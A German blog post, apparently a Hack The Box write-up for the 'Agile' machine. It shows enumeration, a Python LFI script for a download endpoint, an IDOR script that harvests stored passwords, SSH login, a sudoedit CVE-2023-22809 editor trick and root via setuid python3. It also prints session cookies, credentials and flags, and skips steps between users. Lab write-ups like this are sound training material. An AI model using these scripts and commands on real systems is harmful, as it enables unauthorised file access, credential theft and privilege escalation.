---
title: Writeup_Agile
date: 2023-03-07 11:45:00 +0100
categories: [HTB, Maschine]
tags: [ffuf, dirsearch]
comments: false
---


![Bild1](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307084711.png){: width="700" height="400" }


Fangen wir mit einem normal nmap Scan an

```
┌──(bumble㉿bumble)-[~]
└─$ nmap -sV -sC 10.129.173.192    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 07:46 UTC
Nmap scan report for 10.129.173.192
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds

```

ich finde gleich eine Domain, tragen wir die gleich ein und lassen dirsearch sowie ffuf laufen

```
┌──(bumble㉿bumble)-[~]
└─$ dirsearch -u http://superpass.htb 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/bumble/.dirsearch/reports/superpass.htb/_23-03-07_07-48-52.txt

Error Log: /home/bumble/.dirsearch/logs/errors-23-03-07_07-48-52.log

Target: http://superpass.htb/

[07:48:57] Starting: 
[07:49:36] 200 -    3KB - /account/login                                    
[07:50:07] 302 -  249B  - /download  ->  /account/login?next=%2Fdownload    
[07:50:49] 301 -  178B  - /static  ->  http://superpass.htb/static/  


┌──(bumble㉿bumble)-[~]
└─$ ffuf -c -w ~/Downloads/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://superpass.htb -H "Host: FUZZ.superpass.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://superpass.htb
 :: Wordlist         : FUZZ: /home/bumble/Downloads/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.superpass.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 542 req/sec :: Duration: [0:03:30] :: Errors: 0 ::

```



![Bild2](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307085111.png){: width="700" height="400" }

Schauen wir uns da mal um


![Bild3](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307085624.png){: width="700" height="400" }

Versuchen wir uns mal einen User zu registrieren

![Bild4](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307085644.png){: width="700" height="400" }

das klappt


![Bild5](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307085721.png){: width="700" height="400" }

Ich sehe hier eine Export Funktion. Die erfordert aber, das ich zuerst ein Passwort hinterlege, um einen Export auszuführen


![Bild6](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307090120.png){: width="700" height="400" }

Schauen wir mal was in Burp passiert


![Bild7](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307090239.png){: width="700" height="400" }

Ich sehe das ich weitergeleitet werde.

Versuchen wir die Seite direkt aufzurufen

![Bild8](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307090602.png){: width="700" height="400" }

Schauen wir in Burp


![Bild9](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307090629.png){: width="700" height="400" }
Vielleicht bekommen wir hier einen LFI hin

Es klappt


![Bild10](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307090711.png){: width="700" height="400" }

Versuchen wir uns ein Python-Script zu bauen um uns das Leben einfach zu machen

```
import requests
from colorama import Fore, Style

def lfi(path):
try:
	cookies ={"remember_token":"9|8f50cc62e035672203937ef350c45d6a6780afafd9114b725dfb34ffa10cd42e92e484635b44b3f13d76ce1f6af818f2501684844daf93217e66ec4af933165f; session=.eJwlzjsOwjAMANC7ZGZI7DiOe5kq_gnWlk6Iu1OJ8W3vU_Y84nyW7X1c8Sj7y8tWsjFN817XkOiExqIzAZuy5prAbcCCUd1zeLWZ0jAENIDWZEUyHIs7WeeJOcwtaSw166NVlxBRAM9YHelWemtUazPADO7ayx25zjj-GynfH9UiL7A.ZAbuSw.ip5MXZc9fYkSoRCw7i8WytdyDOg"}

url =f"http://superpass.htb/download?fn=..{path}"
req = requests.get(url,cookies=cookies)
if(req.status_code == 200):
    print(Fore.GREEN + f"{req.text}" + Style.RESET_ALL)
else:
    print(Fore.RED + f"{path} not found." + Style.RESET_ALL)

except Exception as e:
    print(Fore.RED + f"LFI Error : {e}" + Style.RESET_ALL)

def main():
    while True:
        path = input(Fore.BLUE + "[+] file >> " + Style.RESET_ALL)
        lfi(path)

if __name__ == "__main__":
    main()
```


![b](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307091725.png){: width="700" height="400" }

ok das Script funktioniert, bei der Suche nach dateien ist mir folgender Eintrag aufgefallen


![b1](/assets/Bilder/Maschine_Agile/Pasted%20image%2020230307093710.png){: width="700" height="400" }

Versuchen wir uns das mal zu laden

```
┌──(bumble㉿bumble)-[~/Downloads/HTB/agile]
└─$ python3 exploit_web.py
[+] file >> /app/app/superpass/views/vault_views.py
import flask
import subprocess                                                                                                                                                                                                                            
from flask_login import login_required,ccurrent_user                                                                                                                                                                                         
from superpass.infrastructure.view_modifiers import response                                                                                                                                                                                 
import superpass.services.password_service as password_service                                                                                                                                                                               
from superpass.services.utility_service import get_random                                                                                                                                                                                    
from superpass.data.password import Password                                                                                                                                                                                                 
blueprint = flask.Blueprint('vault', __name__, template_folder='templates')                                                                                                                                                                  
 @blueprint.route('/vault')                                                                                                                                                                                                                   
@response(template_file='vault/vault.html')                                                                                                                                                                                                  
@login_required                                                                                                                                                                                                                              
def vault():                                                                                                                                                                                                                                 
    passwords = password_service.get_passwords_for_user(current_user.id)                                                                                                                                                                     
    print(f'{passwords=}')                                                                                                                                                                                                                   
    return {'passwords': passwords}                                                                                                                     @blueprint.get('/vault/add_row')                                                                                                                                                                                                             
@response(template_file='vault/partials/password_row_editable.html')                                                                                                                                                                         
@login_required                                                                                                                                                                                                                              
def add_row():                                                                                                                                                                                                                               
    p = Password()                                                                                                                                                                                                                           
    p.password = get_random(20)                                                                                                                                                                                                              
    #import pdb;pdb.set_trace()                                                                                                                                                                                                              
    return {"p": p}                                                                                                                                                                                                                          
 @blueprint.get('/vault/edit_row/<id>')                                                                                                                                                                                                       
@response(template_file='vault/partials/password_row_editable.html')                                                                                                                                                                         
@login_required                                                                                                                                                                                                                              
def get_edit_row(id):                                                                                                                                                                                                                        
    password = password_service.get_password_by_id(id, current_user.id)                                                                                                                                                                      
                                                                                                                                                                                                                                             
    return {"p": password}                                                                                                                                                                                                                   
 @blueprint.get('/vault/row/<id>')                                                                                                                                                                                                            
@response(template_file='vault/partials/password_row.html')                                                                                                                                                                                  
@login_required                                                                                                                                                                                                                              
def get_row(id):                                                                                                                                                                                                                             
    password = password_service.get_password_by_id(id, current_user.id)                                                                                                                                                                      
 return {"p": password}                                                                                                                                                                                                                   
@blueprint.post('/vault/add_row')                                                                                                                                                                                                            
@login_required                                                                                                                                                                                                                              
def add_row_post():                                                                                                                                                                                                                          
    r = flask.request                                                                                                                                                                                                                        
    site = r.form.get('url', '').strip()                                                                                                                                                                                                     
    username = r.form.get('username', '').strip()                                                                                                                                                                                            
    password = r.form.get('password', '').strip()                                                                                                                                                                                             if not (site or username or password):                                                                                                                                                                                                   
        return ''                                                                                                                         p = password_service.add_password(site, username, password, current_user.id)                                                                                                                                                             
    return flask.render_template('vault/partials/password_row.html', p=p)                                                                                                                                                                    
@blueprint.post('/vault/update/<id>')                                                                                                                                                                                                        
@response(template_file='vault/partials/password_row.html')                                                                                                                                                                                  
@login_required                                                                                                                                                                                                                              
def update(id):                                                                                                                                                                                                                              
    r = flask.request                                                                                                                                                                                                                        
    site = r.form.get('url', '').strip()                                                                                                                                                                                                     
    username = r.form.get('username', '').strip()                                                                                                                                                                                            
    password = r.form.get('password', '').strip()                                                                                                                                                                                            
    if not (site or username or password):                                                                                                                                                                                                   
        flask.abort(500)                                                                                                                                                                                                                     
    p = password_service.update_password(id, site, username, password)                                                                                                                                                                       
    return {"p": p}                                                                                                                                                                                                                          
@blueprint.delete('/vault/delete/<id>')                                                                                                                                                                                                      
@login_required                                                                                                                                                                                                                              
def delete(id):                                                                                                                                                                                                                              
    password_service.delete_password(id)                                                                                                                                                                                                     
    return ''                                                                                                                                                                                                                                
@blueprint.get('/vault/export')                                                                                                                                                                                                              
@login_required                                                                                                                                                                                                                              
def export():                                                                                                                                                                                                                                
    if current_user.has_passwords:                                                                                                                                                                                                           
        fn = password_service.generate_csv(current_user)                                                                                                                                                                                     
        return flask.redirect(f'/download?fn={fn}', 302)                                                                                                                                                                                     
    return "No passwords for user"                                                                                                                                                                                                           
 @blueprint.get('/download')                                                                                                                                                                                                                  
@login_required                                                                                                                                                                                                                              
def download():                                                                                                                                                                                                                              
    r = flask.request                                                                                                                                                                                                                        
    fn = r.args.get('fn')                                                                                                                                                                                                                    
    with open(f'/tmp/{fn}', 'rb') as f:                                                                                                                                                                                                      
        data = f.read()                                                                                                                                                                                                                      
    resp = flask.make_response(data)                                                                                                                                                                                                         
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'                                                                                                                                                        
    resp.mimetype = 'text/csv'                                                                                                                                                                                                               
    return resp 
```

So wie es aussieht ist es IDOR Angriff wo ich mir bei anderen Usern, die Passwörter rausholen kann.

```
import requests
from bs4 import BeautifulSoup

def bruteForce():
    cookies = {
    "remember_token":"9|8f50cc62e035672203937ef350c45d6a6780afafd9114b725dfb34ffa10cd42e92e484635b44b3f13d76ce1f6af818f2501684844daf93217e66ec4af933165f","session":".eJwljjsOAzEIBe9CnQJ_MLCXWdmAlbTebBXl7rGUZl4xetJ84Jwrricc73XHA86XwwHElqyn6EVaQbOSKaN0YomqydywtuphErjZ8ugubc7QaijJnZGGKNNwn0lVQywLTeT9GoElceeZs4fv3Y7IOFqEq_Y6XGCH3Fesf43C9wcNKjC1.ZAQZ5A.8FY3Qs9_wuBo8fr_nKTfIGozWa8"

}

  

try:

for id in range(3,10):

url = f"http://superpass.htb/vault/row/{id}"

response = requests.get(url, cookies=cookies)

soup = BeautifulSoup(response.text, 'html.parser')

td_tags = soup.find('tr', class_='password-row').find_all('td')

for td in td_tags:
    print(td.text.strip())

  

except Exception as e:
    print(f"BruteForce Error :{e}")

  

def main():
    bruteForce()

if __name__ == "__main__":
    main()
```


Lassen wir das mal laufen

```
┌──(bumble㉿bumble)-[~/Downloads/HTB/agile]
└─$ python3 idor.py

hackthebox.com
0xdf
762b430d32eea2f12970

mgoblog.com
0xdf
5b133f7a6a1c180646cb

mgoblog
corum
47ed1e73c955de230a1d

ticketmaster
corum
9799588839ed0f98c211

agile
corum
5db7caa1d13cc37c9fc2



```

```

┌──(bumble㉿bumble)-[~]
└─$ ssh corum@superpass.htb
The authenticity of host 'superpass.htb (10.129.173.192)' can't be established.
ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'superpass.htb' (ED25519) to the list of known hosts.
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Thu Mar  2 08:06:55 2023 from 10.10.14.40
corum@agile:~$ ls
user.txt
corum@agile:~$ cat user.txt 
49d4c57b5b770caf3a2efc56167d6341
```

Ich habe habe die Userflag.

Fangen wir mal an uns umzuschauen

```
corum@agile:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:42103         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          127.0.0.1:53068         FIN_WAIT2  
tcp        0      0 127.0.0.1:41829         127.0.0.1:34050         ESTABLISHED
tcp        0      0 127.0.0.1:34060         127.0.0.1:41829         ESTABLISHED
tcp      150      0 127.0.0.1:53068         127.0.0.1:3306          CLOSE_WAIT 
tcp        0      0 127.0.0.1:42103         127.0.0.1:33664         ESTABLISHED
tcp        0    224 10.129.173.192:22       10.10.14.19:55100       ESTABLISHED
tcp        0      0 127.0.0.1:41829         127.0.0.1:34060         ESTABLISHED
tcp        0      0 127.0.0.1:33664         127.0.0.1:42103         ESTABLISHED
tcp        0      1 10.129.173.192:53584    1.1.1.1:53              SYN_SENT   
tcp        0      0 127.0.0.1:34050         127.0.0.1:41829         ESTABLISHED
tcp      150      0 127.0.0.1:53852         127.0.0.1:3306          CLOSE_WAIT 
tcp6       0      0 ::1:42103               :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN  
```

Hier sehe ich einen nicht gewöhnlichen Port auf 41829, schauen wir uns den mal an


```
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
edwards@agile:~$ 

```


https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf

```
export EDITOR='vim -- /app/venv/bin/activate'
sudo -u dev_admin sudoedit /app/config_test.json

```


```
edwards@agile:~$  ls -l /usr/bin/python3.10
-rwsr-xr-x 1 root root 5921160 Nov 14 16:10 /usr/bin/python3.10
edwards@agile:~$ python3 -q
>>> import os
>>> os.setuid(0)
>>> os.system("su")
root@agile:/home/edwards# cd /root
root@agile:~# cat root.txt 
e1cd26791e4506966c88dd5da243717f
root@agile:~# 

```